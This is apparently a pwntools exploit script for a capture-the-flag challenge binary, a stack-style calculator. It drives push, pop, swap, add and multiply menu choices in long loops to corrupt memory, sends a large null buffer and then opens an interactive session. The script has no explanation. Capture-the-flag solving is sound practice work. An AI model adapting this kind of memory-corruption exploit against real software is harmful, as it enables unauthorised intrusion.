#!/usr/bin/python3
from pwn import *

exe = './chal'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
solution:

'''

p = start()

#push
for i in range(0,11):
    p.sendline(b'7')
    p.sendline(b'1')
pause()
#pop
for i in range(0,11):
    p.sendline(b'7')
    p.sendline(b'2')
pause()
for i in range(0,3):
    p.sendline(b'2')
    p.sendline(b'3')
pause()
p.sendline(b'1') #push
p.sendline(b'4') #add (copy)

p.sendline(b'1') #push
p.sendline(b'8') #e
p.sendline(b'1') #push
p.sendline(b'7') #p
p.sendline(b'5') #sub

p.sendline(b'3') #swap
p.sendline(b'2') #pop

p.sendline(b'3') #swap
for i in range(0,36):
    p.sendline(b'6') #mul

p.sendline(b'3') #swap
p.sendline(b'8') #e
p.sendline(b'3') #swap
p.sendline(b'6') #mul

p.sendline(b'3') #swap
p.sendline(b'2') #pop

p.sendline(b'3') #swap
pause()
for i in range(0,56073):
    p.recvuntil(b'choice')
    p.sendline(b'4') #add
    print(i)
pause()
p.sendline(b'3') #swap
p.sendline(b'2') #pop
p.sendline(b'3') #swap
pause()
for i in range(0,3):
    p.sendline(b'1') #push
    p.sendline(b'7') #p
    p.sendline(b'3') #swap

for i in range(0,11):
    p.sendline(b'1') #push
    p.sendline(b'7') #p
pause()
p.sendline(b'\x00'*0x1000)
p.sendline(b'q')

p.interactive()
